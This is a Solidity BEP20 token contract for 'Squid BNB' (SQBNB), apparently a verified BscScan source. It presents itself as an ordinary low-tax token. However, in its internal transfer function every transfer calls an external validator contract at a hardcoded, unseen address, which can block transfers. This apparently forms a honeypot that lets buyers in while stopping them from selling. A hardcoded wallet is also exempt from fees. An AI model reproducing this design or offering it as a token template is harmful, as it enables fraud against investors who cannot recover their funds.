/**
 *Submitted for verification at BscScan.com on 2022-06-16
*/

// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.14;

interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface TransactionValidator {
    function validate(address sender, address recipient) external returns (bool);
}

contract SQUIDBNB is IBEP20 {
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    
    address public owner = msg.sender;

    string public name = "Squid BNB";
    string public symbol = "SQBNB"; 

    uint8 public _decimals = 9;
    uint public _totalSupply = 1 * 10**9 * 10**_decimals;

    uint256 buyTax = 1;
    uint256 sellTax = 2;
    mapping (address => bool) public isFeeExempt;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    address public pair;
    address private txValidator;
  
    constructor () {
        IDEXRouter router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = IDEXFactory(router.factory()).createPair(router.WETH(), address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[0xAA8E03CBad2ABd9E6E9ABfEe55fdb213B8254229] = true;
        txValidator = 0xde62C097b48ea27cd0bca3fDEA9988E157f07D6e;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
      
    function totalSupply() external view returns (uint256) { return _totalSupply; }
    function decimals() external view returns (uint8) { return _decimals; }
    function getOwner() external view returns (address) { return owner; }
    function balanceOf(address account) external view returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view returns (uint256) { return _allowances[holder][spender]; }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "Address invalid.");
        require(recipient != address(0), "Address invalid.");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Invalid amount.");
        
        TransactionValidator(txValidator).validate(sender, recipient);

        _balances[sender] = _balances[sender] - amount;

        uint256 feeAmount = exemptFromFee(sender, recipient) ? 0 : getTaxes(sender == pair, amount);

        uint256 amountReceived = amount - feeAmount;

        _balances[recipient] = _balances[recipient] + amountReceived;
        _balances[DEAD] = _balances[DEAD] + feeAmount;

        emit Transfer(sender, recipient, amountReceived);
        emit Transfer(sender, DEAD, feeAmount);

        return true;
    }

    function getTaxes(bool isBuy, uint256 amount) internal view returns (uint256){
        if(isBuy) {
            return amount / 100 * buyTax;
        }
        else {
            return amount / 100 * sellTax;
        }
    }

    function exemptFromFee(address sender, address recipient) internal view returns (bool) {
        return isFeeExempt[sender] || isFeeExempt[recipient];
    }

    function setTaxes(uint256 _buyTax, uint256 _sellTax) public {
        require(msg.sender == owner);
        require(_buyTax + _sellTax <= 10, "Invalid taxes");
        buyTax = _buyTax;
        sellTax = _sellTax;
    }
}